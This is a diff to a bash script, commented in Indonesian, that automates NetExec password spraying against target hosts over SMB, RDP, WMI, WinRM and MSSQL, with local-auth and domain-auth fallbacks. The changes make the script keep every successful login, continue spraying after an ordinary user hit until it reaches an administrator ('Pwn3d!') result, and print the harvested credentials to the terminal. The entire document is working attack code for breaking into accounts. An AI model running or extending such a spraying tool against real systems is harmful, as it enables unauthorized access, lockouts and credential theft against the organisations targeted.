@@ -136,7 +136,7 @@ process_target_proto() {
         timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" $EXTRA --continue-on-success --no-progress > "$TMP_RES" 2>&1
         sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
         cat "$TMP_RES" >> "$RAW_OUT"
-        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS"
 
         if [[ -s "$TMP_SUCCESS" ]]; then
             break
@@ -153,23 +153,37 @@ process_target_proto() {
     done
 
     # --- FALLBACK LOCAL AUTH ---
-    if [[ ! -s "$TMP_SUCCESS" ]]; then
+    if ! grep -qi "Pwn3d!" "$TMP_SUCCESS"; then    # Tetap jalan mencari Admin jika baru dapat user biasa [+]
         echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" --local-auth --continue-on-success --no-progress${NC}"
         timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" --local-auth --continue-on-success --no-progress > "$TMP_RES" 2>&1
         sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES"
         cat "$TMP_RES" >> "$RAW_OUT"
-        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
+        
+        # TAMBAHAN: Cetak log ke terminal jika local auth berhasil tembus kredensial baru
+        if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
+            echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Local Credentials Found!${NC}"
+            cat "$TMP_RES"
+        fi
+        
+        grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS" # Fiksasi operator append
     fi
-    if [[ ! -s "$TMP_SUCCESS" && -z "$SKIP_DOMAIN" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
+    if ! grep -qi "Pwn3d!" "$TMP_SUCCESS" && [[ -z "$SKIP_DOMAIN" ]] && [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then 
         local attempt_dom=1
         while [ $attempt_dom -le $max_spray ]; do
             echo -e "${GRAY}[CMD] timeout 100s nxc \"$proto\" \"$ip\" -u \"$USER_FILE\" -p \"$PASS_FILE\" -d \"$DOMAIN\" --continue-on-success --no-progress${NC}"
             timeout 100s nxc "$proto" "$ip" -u "$USER_FILE" -p "$PASS_FILE" -d "$DOMAIN" --continue-on-success --no-progress > "$TMP_RES" 2>&1
             sed -i -E 's/\x1B\[[0-9;]*[mGK]//g' "$TMP_RES" 
             cat "$TMP_RES" >> "$RAW_OUT"
-            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" > "$TMP_SUCCESS"
             
-            if [[ -s "$TMP_SUCCESS" ]]; then
+            # TAMBAHAN: Cetak log ke terminal jika explicit domain berhasil mendapat kredensial baru
+            if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
+                echo -e "\n${CYAN}>>> Target Host: $ip (${proto^^}) - Explicit Domain Credentials Found!${NC}"
+                cat "$TMP_RES"
+            fi
+            
+            grep -E "\[\+\]|Pwn3d!" "$TMP_RES" >> "$TMP_SUCCESS" # Fiksasi operator append
+            
+            if grep -qE "\[\+\]|Pwn3d!" "$TMP_RES"; then
                 DOMAIN_ARG="-d $DOMAIN"
                 break
             fi
